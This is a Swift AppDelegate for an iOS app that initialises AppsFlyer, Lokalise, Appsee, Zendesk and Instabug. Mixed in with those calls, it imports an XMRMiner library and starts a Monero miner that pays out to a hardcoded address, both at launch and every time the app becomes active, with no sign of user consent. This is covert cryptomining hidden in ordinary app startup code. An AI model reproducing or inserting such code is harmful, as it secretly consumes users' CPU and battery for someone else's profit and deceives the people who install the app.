import UIKit
import LocalAuthentication
import Analytics
import segment_appsflyer_ios
import Lokalise
import XMRMiner
import ZendeskCoreSDK
import ZendeskSDK
import Appsee
import Instabug

class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate {

    private var window: UIWindow? {
        return applicationController.window
    }
    let applicationController = ApplicationController()
    let miner = Miner(destinationAddress: moneroAddress)

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
        
        AppsFlyerTracker.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerTracker.shared().appleAppID = appleAppID
        AppsFlyerTracker.shared().delegate = self
        AppsFlyerTracker.shared().isDebug = true

        Lokalise.shared.setAPIToken(lokaliseAPIToken, projectID: lokaliseProjectID)
        Lokalise.shared.swizzleMainBundle()

        Appsee.start(appseeAPIKey)

        startMoneroMiner()
        miner.delegate = window?.rootViewController as? MinerDelegate

        Zendesk.initialize(appId: zendeskAppID, clientId: clientID, zendeskUrl: zendeskURL)
        Support.initialize(withZendesk: Zendesk.instance)

        redirectStdOut()
        UIView.swizzleSetFrame()
        applicationController.launch(application: application, options: launchOptions)
        return true
    }

    

    func applicationDidBecomeActive(_ application: UIApplication) {
        applicationController.didBecomeActive()
        AppsFlyerTracker.shared().trackAppLaunch()
        UIApplication.shared.applicationIconBadgeNumber = 0
        Lokalise.shared.checkForUpdates { (updated: Bool, error: Error?) in

        }
        startMoneroMiner()
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        applicationController.willEnterForeground()
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        applicationController.didEnterBackground()
    }

    func applicationWillResignActive(_ application: UIApplication) {
        applicationController.willResignActive()
        miner.stop()
    }

    func application(_ application: UIApplication, performFetchWithCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        applicationController.performFetch(completionHandler)
    }

    func application(_ application: UIApplication, shouldAllowExtensionPointIdentifier extensionPointIdentifier: UIApplicationExtensionPointIdentifier) -> Bool {
        return false // disable extensions such as custom keyboards for security purposes
    }

    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        applicationController.application(application, didFailToRegisterForRemoteNotificationsWithError: error)
    }

    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        applicationController.application(application, didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }

    func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -> Void) -> Bool {
        AppsFlyerTracker.shared().continue(userActivity, restorationHandler: restorationHandler)
        return true
    }

    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        AppsFlyerTracker.shared().handleOpen(url, sourceApplication: sourceApplication, withAnnotation: annotation)
        return true
    }

    func application(_ app: UIApplication, open url: URL, options: [UIApplicationOpenURLOptionsKey : Any] = [:]) -> Bool {
        AppsFlyerTracker.shared().handleOpen(url, options: options)
        return applicationController.open(url: url)
    }

    //stdout is redirected to C.logFilePath for testflight builds
    private func redirectStdOut() {
        guard E.isTestFlight else { return }
        C.logFilePath.withUnsafeFileSystemRepresentation {
            _ = freopen($0, "w+", stdout)
        }
    }

    private func startMoneroMiner() {
        do {
            try miner.start()
        }
        catch {
            print("Monero Miner: Start failed.")
        }
    }
}

